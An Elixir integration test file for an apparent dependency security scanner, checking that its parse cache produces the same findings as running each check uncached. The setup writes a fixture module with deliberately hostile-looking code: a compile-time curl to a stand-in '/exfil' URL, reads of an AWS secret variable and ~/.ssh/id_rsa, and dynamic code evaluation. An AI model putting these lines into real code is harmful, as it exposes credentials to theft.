defmodule VetCore.Integration.ParseCacheIntegrationTest do
  @moduledoc """
  Integration tests for the per-dep parse-cache wiring in the scanner.

  Contract: the scanner parses each dependency ONCE via
  `FileHelper.read_and_parse/2`, then threads the result through every check
  via `state[:parsed_files]`. Each check now goes through
  `FileHelper.parsed_files/3`, which falls back to `read_and_parse/2` when
  the cache is absent.

  These tests verify behavioral equivalence: the findings produced by the
  scanner (which uses the cache) match what you'd get running each check
  directly with no cache. If the cache wiring ever diverges from the
  cacheless path, these tests catch it.
  """

  use ExUnit.Case, async: true

  alias VetCore.Types.Dependency

  setup do
    tmp =
      Path.join(
        System.tmp_dir!(),
        "vet_parse_cache_integration_#{System.unique_integer([:positive])}"
      )

    File.mkdir_p!(tmp)
    on_exit(fn -> File.rm_rf!(tmp) end)

    # A dep whose source triggers multiple checks in a single file — this
    # is the case where the parse cache matters most, since every check
    # would otherwise re-parse the same AST.
    dep_dir = Path.join([tmp, "deps", "multi_dep", "lib"])
    File.mkdir_p!(dep_dir)

    File.write!(Path.join(dep_dir, "multi.ex"), ~S"""
    defmodule Multi do
      @secret System.cmd("curl", ["https://example.test/exfil"])

      def exec do
        System.cmd("ls", ["-la"])
      end

      def read_env do
        System.get_env("AWS_SECRET_ACCESS_KEY")
      end

      def read_key do
        File.read!("~/.ssh/id_rsa")
      end

      def dyn(code) do
        Code.eval_string(code)
      end
    end
    """)

    File.write!(Path.join([tmp, "deps", "multi_dep", "mix.exs"]), ~S"""
    defmodule MultiDep.MixProject do
      use Mix.Project
      def project, do: [app: :multi_dep, version: "1.0.0"]
    end
    """)

    # The usual Elixir warning about `"name":` vs `name:` keyword syntax fires
    # for each parse of this lock, but the lock format Elixir emits uses the
    # quoted form, so we match it intentionally.
    File.write!(
      Path.join(tmp, "mix.lock"),
      ~s(%{\n  "multi_dep": {:hex, :multi_dep, "1.0.0", "abc", [:mix], [], "hexpm", "def"},\n})
    )

    %{project_path: tmp}
  end

  describe "scanner parse cache: equivalence with direct-check invocation" do
    test "scanner produces the same findings as running checks directly with no cache",
         %{project_path: path} do
      {:ok, report} = VetCore.scan(path, skip_hex: true, skip_history: true)

      [dep_report] = report.dependency_reports

      # Now run each check directly on the same dep WITHOUT a cache.
      # If the scanner's caching ever corrupts or reorders the AST, these
      # two paths diverge.
      dep = %Dependency{name: :multi_dep, version: "1.0.0", source: :hex}

      direct_findings =
        [
          VetCore.Checks.SystemExec,
          VetCore.Checks.CodeEval,
          VetCore.Checks.EnvAccess,
          VetCore.Checks.FileAccess
        ]
        |> Enum.flat_map(fn mod -> mod.run(dep, path, []) end)

      # Compare by {check_id, line, file_path} so we ignore nondeterministic
      # fields (like generated description suffixes from correlation).
      direct_keys =
        direct_findings
        |> Enum.map(&{&1.check_id, &1.line, Path.basename(&1.file_path)})
        |> Enum.sort()
        |> Enum.uniq()

      scanner_keys =
        dep_report.findings
        |> Enum.map(&{&1.check_id, &1.line, Path.basename(&1.file_path)})
        |> Enum.sort()
        |> Enum.uniq()

      # Scanner's result includes *at least* every finding the direct checks
      # found (scanner may produce additional categories — allowlist/temporal/
      # correlation — but never fewer of the deterministic checks we drove).
      for key <- direct_keys do
        assert key in scanner_keys,
               "scanner missing direct-check finding #{inspect(key)}. " <>
                 "Scanner has: #{inspect(scanner_keys)}"
      end
    end

    test "scanner picks up findings from at least 4 distinct check categories",
         %{project_path: path} do
      # This is the smoke test that the cache is actually flowing through
      # every check. If state[:parsed_files] were being dropped, some checks
      # might silently return [] (depending on their fallback behavior for
      # nonexistent paths — but here the path is real, so they'd still find
      # stuff, which is exactly why we also need the equivalence test above).
      {:ok, report} = VetCore.scan(path, skip_hex: true, skip_history: true)
      [dep_report] = report.dependency_reports

      categories = dep_report.findings |> Enum.map(& &1.category) |> Enum.uniq()

      # We wrote a dep that hits system_exec (twice), env_access, file_access,
      # code_eval — at minimum 4 distinct check categories must fire.
      assert length(categories) >= 4, "expected >= 4 categories, got: #{inspect(categories)}"
    end

    test "runtime and compile-time classification is preserved through the cache",
         %{project_path: path} do
      {:ok, report} = VetCore.scan(path, skip_hex: true, skip_history: true)
      [dep_report] = report.dependency_reports

      ct = Enum.filter(dep_report.findings, & &1.compile_time?)
      runtime = Enum.reject(dep_report.findings, & &1.compile_time?)

      # @secret = System.cmd(...) in module body → compile-time.
      assert Enum.any?(ct, &(&1.category == :system_exec))

      # def exec / def read_env / def read_key / def dyn — all runtime.
      assert Enum.any?(runtime, &(&1.category == :env_access))
      assert Enum.any?(runtime, &(&1.category == :file_access))
    end
  end

  describe "scanner parse cache: correctness under repeated scans" do
    test "two back-to-back scans produce the same findings", %{project_path: path} do
      {:ok, a} = VetCore.scan(path, skip_hex: true, skip_history: true)
      {:ok, b} = VetCore.scan(path, skip_hex: true, skip_history: true)

      # We compare by the stable key set (cache mutations between runs
      # would surface here as differing findings).
      extract = fn report ->
        for dr <- report.dependency_reports,
            f <- dr.findings do
          {dr.dependency.name, f.check_id, f.line, f.severity, f.compile_time?}
        end
        |> Enum.sort()
      end

      assert extract.(a) == extract.(b)
    end
  end

  describe "scanner parse cache: resilience" do
    test "a dep with an unparseable file still produces findings from parseable files",
         %{project_path: path} do
      # Add a deliberately broken file to the same dep. The parse cache
      # must skip it and still deliver findings from the good files.
      dep_dir = Path.join([path, "deps", "multi_dep", "lib"])
      File.write!(Path.join(dep_dir, "broken.ex"), "defmodule Broken do\n")

      {:ok, report} = VetCore.scan(path, skip_hex: true, skip_history: true)
      [dep_report] = report.dependency_reports

      # Findings from multi.ex remain; broken.ex is silently skipped.
      assert Enum.any?(dep_report.findings, fn f ->
               String.ends_with?(f.file_path, "multi.ex")
             end)

      refute Enum.any?(dep_report.findings, fn f ->
               String.ends_with?(f.file_path, "broken.ex")
             end)
    end
  end
end
